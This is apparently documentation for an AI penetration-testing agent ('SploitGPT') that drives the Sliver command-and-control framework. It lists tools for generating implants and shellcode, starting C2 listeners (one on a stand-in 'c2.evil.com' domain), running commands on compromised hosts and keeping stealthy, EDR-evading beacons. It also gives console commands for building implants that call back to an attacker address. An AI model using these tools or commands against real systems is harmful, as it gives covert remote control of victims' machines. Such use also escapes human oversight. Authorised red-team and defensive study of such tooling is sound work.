# Sliver C2 Tools Reference

This document describes the Sliver C2 tools available in SploitGPT for interacting with Sliver C2 server during penetration testing engagements.

## Overview

SploitGPT integrates with Sliver C2 via gRPC, providing 9 operational tools for managing implants, sessions, listeners, and command execution.

## Known Limitations

### Implant Generation (sliver_generate) - DISABLED

The `sliver_generate` tool is currently disabled due to a known Sliver server bug that causes "record not found" errors during implant compilation. This is a server-side issue tracked at:
- https://github.com/BishopFox/sliver/issues/1771
- https://github.com/BishopFox/sliver/issues/1863

**Workaround:** Generate implants manually using the Sliver console:

```bash
# Interactive session implant
sliver > generate --mtls 10.0.0.1:8888 --os linux --arch amd64 --save ./implant

# Beacon (async) implant  
sliver > generate beacon --mtls 10.0.0.1:8888 --os windows --arch amd64 --seconds 60 --jitter 30

# Shellcode format
sliver > generate --mtls 10.0.0.1:8888 --os windows --format shellcode
```

All other Sliver tools (session management, command execution, listeners) work correctly.

## When to Use Sliver vs Metasploit

| Use Case | Recommended Framework | Reason |
|----------|----------------------|--------|
| Modern EDR environments | **Sliver** | Better evasion, in-memory execution |
| Long-term persistence | **Sliver** | Beacons with jitter, less detectable |
| Exploit development/execution | **Metasploit** | Larger exploit library |
| Known CVE exploitation | **Metasploit** | Pre-built exploits |
| Post-exploitation (stealth) | **Sliver** | Cleaner OPSEC |
| Post-exploitation (tools) | **Metasploit** | Meterpreter modules |
| Red team operations | **Sliver** | Modern C2 features |
| CTF/Lab environments | **Metasploit** | Faster, established workflows |
| Pivoting through networks | **Sliver** | Native TCP pivots, SOCKS5 |
| Credential dumping | **Either** | Both have capabilities |

### Quick Decision Guide

- **Use Sliver when:** Stealth matters, EDR present, need beacons, modern Windows targets, red team ops
- **Use Metasploit when:** Need specific exploit, auxiliary scanners, rapid testing, established workflow

---

## Tool Reference

### 1. sliver_sessions

**Description:** List all active Sliver sessions (real-time) and beacons (async check-in).

**Parameters:** None

**Returns:** Formatted list of sessions and beacons with ID, hostname, OS, transport, and check-in info.

**Example Usage:**
```python
sliver_sessions()
```

**When to use:** 
- At the start of engagement to see available implants
- After deploying implants to verify callback
- Before executing commands to get target IDs

**Output Example:**
```
**Sessions (1):**
  `abc12345...` - **DESKTOP-PC**
    Host: admin@DESKTOP-PC
    OS: windows/amd64 | PID: 1234
    Transport: mtls

**Beacons (2):**
  `def67890...` - **WEB-SERVER**
    Host: www-data@web-server
    OS: linux/amd64 | PID: 5678
    Interval: 60s | Jitter: 30%
```

---

### 2. sliver_use

**Description:** Select a session or beacon for interaction. Shows detailed information about the target.

**Parameters:**
| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `target_id` | string | Yes | Session or beacon ID (can be partial, e.g., first 8 chars) |

**Example Usage:**
```python
sliver_use(target_id="abc12345")
sliver_use(target_id="abc1")  # Partial ID works
```

**When to use:**
- To get detailed info about a specific implant
- Before running commands to confirm target
- To switch context between multiple implants

---

### 3. sliver_execute

**Description:** Execute a command on a Sliver session or beacon.

**Parameters:**
| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `target_id` | string | Yes | Session or beacon ID |
| `command` | string | Yes | Command/binary to execute (e.g., "whoami", "/bin/ls") |
| `args` | list[str] | No | Optional arguments for the command |

**Example Usage:**
```python
# Simple command
sliver_execute(target_id="abc12345", command="whoami")

# Command with arguments
sliver_execute(target_id="abc12345", command="ls", args=["-la", "/etc"])

# Windows command
sliver_execute(target_id="abc12345", command="net", args=["user"])
```

**When to use:**
- Post-exploitation enumeration
- Running recon commands on target
- Executing tools/scripts on compromised host

**Notes:**
- Sessions return output immediately
- Beacons queue commands for next check-in (may take up to beacon interval)

---

### 4. sliver_kill

**Description:** Terminate a session or beacon.

**Parameters:**
| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `target_id` | string | Yes | Session or beacon ID to kill |
| `force` | bool | No | Force kill (for sessions). Default: False |

**Example Usage:**
```python
sliver_kill(target_id="abc12345")
sliver_kill(target_id="abc12345", force=True)
```

**When to use:**
- Cleaning up after engagement
- Removing compromised/burned implants
- Switching to a different implant type

---

### 5. sliver_listeners

**Description:** List all active Sliver C2 listeners (jobs).

**Parameters:** None

**Returns:** List of running listeners with job ID, protocol, port, and domains.

**Example Usage:**
```python
sliver_listeners()
```

**When to use:**
- Check what listeners are available before generating implants
- Verify listener is running after starting
- Before stopping listeners to get job IDs

**Output Example:**
```
**Active Listeners (2):**

  Job #1: **mtls**
    Protocol: mTLS | Port: 8888

  Job #2: **https**
    Protocol: HTTPS | Port: 443
    Domains: cdn.example.com
```

---

### 6. sliver_start_listener

**Description:** Start a new Sliver C2 listener.

**Parameters:**
| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| `protocol` | string | Yes | - | Listener type: "mtls", "http", "https", "dns" |
| `host` | string | No | "0.0.0.0" | Interface to bind |
| `port` | int | No | Protocol default | Port to listen on |
| `domain` | string | No | "" | Domain name (required for DNS, optional for HTTP/S) |
| `persistent` | bool | No | False | Restart listener on server restart |

**Default Ports:** mTLS=8888, HTTP=80, HTTPS=443, DNS=53

**Example Usage:**
```python
# Start mTLS listener
sliver_start_listener(protocol="mtls", port=8888)

# Start HTTPS listener with domain
sliver_start_listener(protocol="https", port=443, domain="cdn.example.com")

# Start DNS listener (domain required)
sliver_start_listener(protocol="dns", domain="c2.evil.com")

# Persistent listener
sliver_start_listener(protocol="mtls", port=9999, persistent=True)
```

**When to use:**
- Before generating implants (implant needs matching listener)
- Setting up C2 infrastructure
- Adding redundant C2 channels

**Protocol Selection:**
- **mTLS:** Most secure, mutual TLS authentication, best for internal networks
- **HTTPS:** Blends with web traffic, good for egress filtering
- **HTTP:** Testing only (no encryption)
- **DNS:** Bypasses most firewalls, slower, requires DNS setup

---

### 7. sliver_stop_listener

**Description:** Stop a Sliver listener by job ID.

**Parameters:**
| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `job_id` | int | Yes | Job ID of the listener to stop |

**Example Usage:**
```python
sliver_stop_listener(job_id=1)
```

**When to use:**
- Cleaning up listeners after engagement
- Stopping unused listeners to free ports
- Rotating C2 infrastructure

---

### 8. sliver_generate

**Description:** Generate a Sliver implant (session or beacon).

**Parameters:**
| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| `os` | string | No | "linux" | Target OS: "linux", "windows", "darwin" |
| `arch` | string | No | "amd64" | Architecture: "amd64", "386", "arm64" |
| `c2_url` | string | Yes | - | C2 callback URL (e.g., "mtls://10.0.0.1:8888") |
| `is_beacon` | bool | No | False | Generate beacon (async) vs session (interactive) |
| `beacon_interval` | int | No | 60 | Beacon check-in interval in seconds |
| `beacon_jitter` | int | No | 30 | Beacon jitter percentage (0-100) |
| `format` | string | No | "EXECUTABLE" | Output format: "EXECUTABLE", "SHARED_LIB", "SERVICE", "SHELLCODE" |
| `name` | string | No | "" | Implant name (auto-generated if empty) |
| `save_path` | string | No | "" | Path to save implant |

**Example Usage:**
```python
# Generate Windows session implant
sliver_generate(
    os="windows",
    arch="amd64",
    c2_url="mtls://10.0.0.1:8888",
    save_path="/app/loot/implant.exe"
)

# Generate stealthy Linux beacon
sliver_generate(
    os="linux",
    arch="amd64",
    c2_url="https://cdn.example.com:443",
    is_beacon=True,
    beacon_interval=300,
    beacon_jitter=50,
    save_path="/app/loot/beacon"
)

# Generate shellcode for injection
sliver_generate(
    os="windows",
    arch="amd64",
    c2_url="mtls://10.0.0.1:8888",
    format="SHELLCODE",
    save_path="/app/loot/beacon.bin"
)
```

**When to use:**
- After starting a listener, generate implant with matching C2 URL
- Need session: Real-time interaction, active exploitation
- Need beacon: Stealth, persistence, EDR evasion

**Session vs Beacon:**
- **Session:** Constant connection, immediate commands, easier to detect
- **Beacon:** Periodic check-in, queued commands, stealthier, survives network issues

---

### 9. sliver_profiles

**Description:** List saved implant profiles (pre-configured templates).

**Parameters:** None

**Returns:** List of profiles with name, OS/arch, type, and C2 configuration.

**Example Usage:**
```python
sliver_profiles()
```

**When to use:**
- Check if pre-configured profiles exist
- Before generating implants to use saved config
- To see available implant templates

---

### 10. sliver_version

**Description:** Get Sliver server version and operator information.

**Parameters:** None

**Returns:** Server version, commit, compilation info, and list of operators.

**Example Usage:**
```python
sliver_version()
```

**When to use:**
- Verify Sliver server is running and accessible
- Check server version for compatibility
- See who else is connected (multi-operator)

---

## Typical Workflow

### 1. Setup C2 Infrastructure
```python
# Check server status
sliver_version()

# Start listener
sliver_start_listener(protocol="mtls", port=8888)

# Verify listener
sliver_listeners()
```

### 2. Generate & Deploy Implant
```python
# Generate implant
sliver_generate(
    os="windows",
    arch="amd64",
    c2_url="mtls://YOUR_IP:8888",
    is_beacon=True,
    beacon_interval=60,
    beacon_jitter=30,
    save_path="/app/loot/beacon.exe"
)

# Wait for callback, then check
sliver_sessions()
```

### 3. Interact with Target
```python
# Select target
sliver_use(target_id="abc12345")

# Run commands
sliver_execute(target_id="abc12345", command="whoami")
sliver_execute(target_id="abc12345", command="hostname")
sliver_execute(target_id="abc12345", command="ipconfig", args=["/all"])
```

### 4. Cleanup
```python
# Kill implants
sliver_kill(target_id="abc12345")

# Stop listeners
sliver_stop_listener(job_id=1)
```

---

## Error Handling

Common errors and solutions:

| Error | Cause | Solution |
|-------|-------|----------|
| "could not connect to Sliver server" | Server not running or config missing | Check Sliver container, verify config path |
| "No session or beacon found" | Invalid target_id | Use `sliver_sessions()` to get valid IDs |
| "DNS listener requires a domain" | Missing domain for DNS | Add `domain="your.domain.com"` |
| "protocol must be one of..." | Invalid protocol name | Use "mtls", "http", "https", or "dns" |
| "c2_url is required" | Missing callback URL | Provide full URL like "mtls://10.0.0.1:8888" |

---

## Integration Notes

- Sliver tools connect via gRPC using operator config (default: `configs/sliver/sploitgpt.cfg`)
- The Sliver container must be running and accessible
- Environment variable `SPLOITGPT_SLIVER_CONFIG` overrides default config path
- All tools have automatic retry logic for connection issues
